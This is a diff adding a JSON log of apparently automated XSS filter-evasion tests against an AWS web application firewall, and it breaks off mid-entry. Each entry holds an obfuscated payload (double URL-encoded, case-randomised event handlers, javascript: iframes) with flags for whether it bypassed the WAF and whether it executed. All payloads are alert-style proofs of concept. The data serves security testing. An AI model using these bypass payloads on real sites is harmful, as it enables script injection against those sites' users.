@@ -1,0 +1,1340 @@
+[
+    {
+        "payload": "<svg/ontouchend=alert(1)>",
+        "technique": "Direct JS Call XSS (manual refine)_non_script_xss+IMG onerror+Body onLoad_adv_obf_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass+SVG onEvent_adv_obf_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<svg/ontouchend=alert(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg ontouchend=\"alert(1)\"></svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cSVg/OnLOaD%253dAlErT%25281%2529%253E",
+        "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass+SVG onEvent_adv_obf_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<SVg/OnLOaD=AlErT(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onload=\"AlErT(1)\"></svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cbODy%2520onLoAD%253dALeRT%25281%2529%253E",
+        "technique": "obf_double_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "<bODy onLoAD=ALeRT(1)>",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253Csvg/onmouseover%253Dalert%25281%2529%253E",
+        "technique": "SVG onEvent_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<svg/onmouseover=alert(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onmouseover=\"alert(1)\"></svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "<!-- %253Cimg%2520oNCoNtEXtmenuDAnGeRoUs%253d%2527alert%25281%2529%2527%253E%253C%252Fimg%253E --><img src=x onerror = alert(64)>",
+        "technique": "SVG onEvent_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss+IMG onerror+Body onLoad_adv_obf_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<!-- <img oNCoNtEXtmenuDAnGeRoUs='alert(1)'></img> --><img src=x onerror = alert(64)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"x\" onerror=\"alert(64)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cIFRAME%2520SRC%253dJAVASCRIPT%253aALERT%25281%2529%253etivitas%2520web!Cross-Site Scripting in JavaScript%2526EI maçk=YIBM",
+        "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<IFRAME SRC=JAVASCRIPT:ALERT(1)>tivitas web!Cross-Site Scripting in JavaScript&EI maçk=YIBM",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "iframe",
+                        "html": "<iframe src=\"JAVASCRIPT:ALERT(1)\">tivitas web!Cross-Site Scripting in JavaScript&EI maçk=YIBM</iframe>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cIMG/%252a%252150000%252A/SRC%253dX/%252A%252150000%252A/ONERROR%253dLOCATION%253d%2527JAVASCRIPT%253aALERT%25281%2529%2527%253e",
+        "technique": "Direct JS Call XSS (manual refine)_non_script_xss+SVG onEvent_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<IMG/*!500OO*/SRC=X/*!500OO*/ONERROR=LOCATION='JAVASCRIPT:ALERT(1)'>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img *!500oo*=\"\" src=\"X/*!500OO*/ONERROR=LOCATION='JAVASCRIPT:ALERT(1)'\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253CsVG/ONlOad%253DALErT%25281%2529%253E",
+        "technique": "SVG onEvent_adv_obf_full_bypass+obf_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<sVG/ONlOad=ALErT(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onload=\"ALErT(1)\"></svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253CsCRiPT%253EALErT%25281%2529%253C/SCRiPt%253E",
+        "technique": "obf_double_url_encode+obf_case_random_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<sCRiPT>ALErT(1)</SCRiPt>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "script",
+                        "html": "<script>ALErT(1)</script>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253Cimg/%252A%252150000%252a/src%253Dx/%252A%252150000%252A/onerror%253Dalert%2528974%2529%253E",
+        "technique": "Direct JS Call XSS (manual refine)_non_script_xss+obf_url_encode+obf_case_random_full_bypass+obf_double_url_encode+obf_case_random_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<img/*!500OO*/src=x/*!500OO*/onerror=alert(974)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img *!500oo*=\"\" src=\"x/*!500OO*/onerror=alert(974)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cSvG/onlOad%253daLeRT%25281%2529%253e",
+        "technique": "obf_whitespace_url+obf_case_random_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<SvG/onlOad=aLeRT(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onload=\"aLeRT(1)\"></svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253CBodY%2520oNLoAd%253daLeRT%25281%2529%253e",
+        "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass+obf_double_url_encode+obf_case_random_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "<BodY oNLoAd=aLeRT(1)>",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253Csvg/oNloAD%253dAlErT%25281%2529%253E&aBFX=bVsc",
+        "technique": "SVG onEvent_adv_obf_full_bypass+obf_whitespace_url+obf_case_random_full_bypass+obf_double_url_encode+obf_case_random_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<svg/oNloAD=AlErT(1)>&aBFX=bVsc",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onload=\"AlErT(1)\">&amp;aBFX=bVsc</svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%25253cBODY%252520ONLOAD%25253dALERT%2525281%252529%25253e",
+        "technique": "obf_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "<BODY ONLOAD=ALERT(1)>",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cImG%2520sRC%253dX%2520OnerrOr%253dALerT%25281%2529%253e",
+        "technique": "obf_url_encode+obf_case_random_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass+obf_double_url_encode+obf_case_random_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<ImG sRC=X OnerrOr=ALerT(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"X\" onerror=\"ALerT(1)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cImg%2520sRC%253dx%2520onerRoR%253daLeRt%25281%2529%253e",
+        "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass+SVG onEvent_adv_obf_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass+obf_whitespace_url+obf_case_random_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<Img sRC=x onerRoR=aLeRt(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"x\" onerror=\"aLeRt(1)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "ONMOUSEDOWN%253D",
+        "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "ONMOUSEDOWN=",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253Csvg/onmouseoverD%253DDATa%2520OnViewE%253dALert%2560XsS%2560%253e",
+        "technique": "SVG onEvent_adv_obf_full_bypass+obf_double_url_encode+obf_case_random_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<svg/onmouseoverD=DATa OnViewE=ALert`XsS`>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onmouseoverd=\"DATa\" onviewe=\"ALert`XsS`\"></svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253Cembed%2520OncOPY%253D%2527String.fromCharCode%252899%252C111%252C110%252C102%252C105%252C114%252C109%2529%25281%2529%2527%253E%253Cdiv%253Etest%253C/body",
+        "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<embed OncOPY='String.fromCharCode(99,111,110,102,105,114,109)(1)'><div>test</body",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "embed",
+                        "html": "<embed oncopy=\"String.fromCharCode(99,111,110,102,105,114,109)(1)\">"
+                    },
+                    {
+                        "tag_name": "div",
+                        "html": "<div>test</div>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%25253cIFRAme%252520sRC%25253dJAVAsCripT%25253aAleRt%2525281%252529%25253e",
+        "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass+obf_url_encode+obf_case_random_full_bypass+obf_whitespace_url+obf_case_random_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<IFRAme sRC=JAVAsCripT:AleRt(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "iframe",
+                        "html": "<iframe src=\"JAVAsCripT:AleRt(1)\"></iframe>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%25253cimg%252520src%25253Dx%252520onerror%25253Dalert%2525281%252529%25253e",
+        "technique": "IMG onerror+Body onLoad_adv_obf_full_bypass+obf_double_url_encode+obf_case_random_full_bypass+obf_url_encode+obf_case_random_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<img src=x onerror=alert(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"x\" onerror=\"alert(1)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253Cimg%2520sRC%253dX%2520ONErRoR%253DaLerT%25281%2529%253E",
+        "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass+obf_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<img sRC=X ONErRoR=aLerT(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"X\" onerror=\"aLerT(1)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cA%2520ONMoUSeMOvE%253d%2527sTRING.FROMcHARcODE%252899%252c111%252c110%252c102%252c105%252c114%252c109%2529%25281%2529%2527%253e%253c%252fA%",
+        "technique": "obf_double_url_encode+obf_case_random_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<A ONMoUSeMOvE='sTRING.FROMcHARcODE(99,111,110,102,105,114,109)(1)'></A%",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "a",
+                        "html": "<a onmousemove=\"sTRING.FROMcHARcODE(99,111,110,102,105,114,109)(1)\"></a>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "<svg/ontouchend='alert(1)'>%20</div> /*54*/",
+        "technique": "SVG onEvent_adv_obf_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<svg/ontouchend='alert(1)'> </div> /*54*/",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg ontouchend=\"alert(1)\">  /*54*/</svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "ONMoUSEoVER= /*63*/ -- 90",
+        "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "ONMoUSEoVER= /*63*/ -- 9O",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cSVg/OnLOaD%253dALErT%25281%2529%253E",
+        "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass+obf_whitespace_url+obf_case_random_full_bypass+SVG onEvent_adv_obf_full_bypass+obf_double_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<SVg/OnLOaD=ALErT(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onload=\"ALErT(1)\"></svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253CBODy%2520oNloAd%253daLeRT%25281%2529%253E</img>",
+        "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass+obf_whitespace_url+obf_case_random_full_bypass+obf_double_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "<BODy oNloAd=aLeRT(1)></img>",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cSvG&#47;OnlOAd%253dAleRT%25281%2529%253e",
+        "technique": "obf_double_url_encode+obf_case_random_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss+SVG onEvent_adv_obf_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<SvG/OnlOAd=AleRT(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onload=\"AleRT(1)\"></svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253CImG%252509SrC%253Dx%252509oNeRROR%253DalErt%25281%2529%253E",
+        "technique": "obf_whitespace_url+obf_case_random_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "<ImG\tSrC=x\toNeRROR=alErt(1)>",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cIMG%2520sRc%253dx%2520OnERroR%253dLoCDAtALErT%25281%2529%253e",
+        "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<IMG sRc=x OnERroR=LoCDAtALErT(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"x\" onerror=\"LoCDAtALErT(1)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "<!-- ONCLICK= --><img src=x onerror=alert(1)>",
+        "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<!-- ONCLICK= --><img src=x onerror=alert(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"x\" onerror=\"alert(1)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "<!-- %253CIMG%250Asrc%253Dx%250Aonerror%253Dprompt%25281%2529%253E --><img src=x onerror=alert(1)>",
+        "technique": "IMG onerror+Body onLoad_adv_obf_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<!-- <IMG\nsrc=x\nonerror=prompt(1)> --><img src=x onerror=alert(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"x\" onerror=\"alert(1)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "<svg><wbr%20onkeyup=\"alert(1)\" contenteditable>test</svg>",
+        "technique": "SVG onEvent_adv_obf_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<svg><wbr onkeyup=\"alert(1)\" contenteditable>test</svg>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg><wbr onkeyup=\"alert(1)\" contenteditable=\"\">test</wbr></svg>"
+                    },
+                    {
+                        "tag_name": "wbr",
+                        "html": "<wbr onkeyup=\"alert(1)\" contenteditable=\"\">test</wbr>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253Cdetails%250Asvg/onload%253Dprompt%25281%2529%253E&kUWG=MNOc",
+        "technique": "SVG onEvent_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<details\nsvg/onload=prompt(1)>&kUWG=MNOc",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "details",
+                        "html": "<details svg=\"\" onload=\"prompt(1)\">&amp;kUWG=MNOc</details>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%25253cScript%25253EalErT%2525281%252529%25253C/sCrIPt%25253e",
+        "technique": "obf_url_encode+obf_case_random_full_bypass+obf_whitespace_url+obf_case_random_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<Script>alErT(1)</sCrIPt>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "script",
+                        "html": "<script>alErT(1)</script>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253csvg/onmouSEoveR%253dAlErt%25281%2529%253e",
+        "technique": "SVG onEvent_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass+obf_whitespace_url+obf_case_random_full_bypass",
+        "attack_type": "xss_dom",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<svg/onmouSEoveR=AlErt(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onmouseover=\"AlErt(1)\"></svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "<!-- %253Cimg%250Asrc%253Dx%250Aonerror%253Dalert%25281%2529%253E --><Img Src=x OnError=confirm(1)>",
